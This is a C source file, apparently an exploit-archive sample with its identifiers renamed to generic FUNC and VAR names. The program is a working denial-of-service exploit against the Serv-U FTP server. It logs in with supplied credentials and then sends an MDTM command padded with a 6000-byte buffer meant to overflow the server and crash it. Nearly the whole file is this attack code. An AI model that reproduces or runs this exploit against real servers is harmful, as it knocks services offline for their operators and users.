
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int) ;
 scalar_t__ FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int) ;
 struct hostent* FUNC_4 (char*) ;
 int FUNC_5 (int ) ;
 int FUNC_6 (char*,char,int) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (int,char*,int ,int ) ;
 int FUNC_10 (int) ;
 int FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (char*,char*,char*) ;
 int FUNC_13 (char*) ;

int FUNC_14(int VAR_2, char *VAR_3[]) {
        if(VAR_2 < 5) {
                FUNC_8("Serv-U 'MDTM' buffer overflow DoS exploit.\n");
                FUNC_8("by shaun2k2 - <shaunige@yahoo.co.uk>.\n\n");
                FUNC_8("Usage: %s <host> <port> <login> <password>\n", VAR_3[0]);
                FUNC_3(-1);
        }

        int VAR_4;
        char VAR_5[6032];
        char VAR_6[100];
        char VAR_7[100];
        char VAR_8[6000];
        struct sockaddr_in VAR_9;
        struct hostent *VAR_10;


        if((VAR_10 = FUNC_4(VAR_3[1])) == ((void*)0)) {
                FUNC_8("Couldn't resolve %s!\n", VAR_3[1]);
                FUNC_3(-1);
        }


        if((VAR_4 = FUNC_11(VAR_0, VAR_1, 0)) < 0) {
                FUNC_7("socket()");
                FUNC_3(-1);
        }


        VAR_9.sin_family = VAR_0;
        VAR_9.sin_port = FUNC_5(FUNC_0(VAR_3[2]));
        VAR_9.sin_addr = *((struct in_addr *)VAR_10->h_addr);

        FUNC_8("Serv-U 'MDTM' buffer overflow DoS exploit.\n");
        FUNC_8("by shaun2k2 - <shaunige@yahoo.co.uk>.\n\n");

        FUNC_8("Crafting exploit buffer...\n\n");

        FUNC_6(VAR_8, 'a', 6000);
        FUNC_12(VAR_6, "USER %s\n", VAR_3[3]);
        FUNC_12(VAR_7, "PASS %s\n", VAR_3[4]);
        FUNC_12(VAR_5, "MDTM 20031111111111+%s\r\n", VAR_8);


        FUNC_8("[+] Connecting...\n");
        if(FUNC_2(VAR_4, (struct sockaddr *)&VAR_9, sizeof(struct sockaddr)) < 0) {
                FUNC_7("connect()");
                FUNC_3(-1);
        }

        FUNC_8("[+] Connected!\n\n");

        FUNC_8("[+] Sending exploit buffers...\n");
        FUNC_10(1);
        FUNC_9(VAR_4, VAR_6, FUNC_13(VAR_6), 0);
        FUNC_10(2);
        FUNC_9(VAR_4, VAR_7, FUNC_13(VAR_7), 0);
        FUNC_10(2);
        FUNC_9(VAR_4, VAR_5, FUNC_13(VAR_5), 0);
        FUNC_10(1);
        FUNC_8("[+] Exploit buffer sent!\n\n");

        FUNC_1(VAR_4);

        FUNC_8("[+] Done!  Check if the Serv-U server has crashed.\n");

        return(0);
}
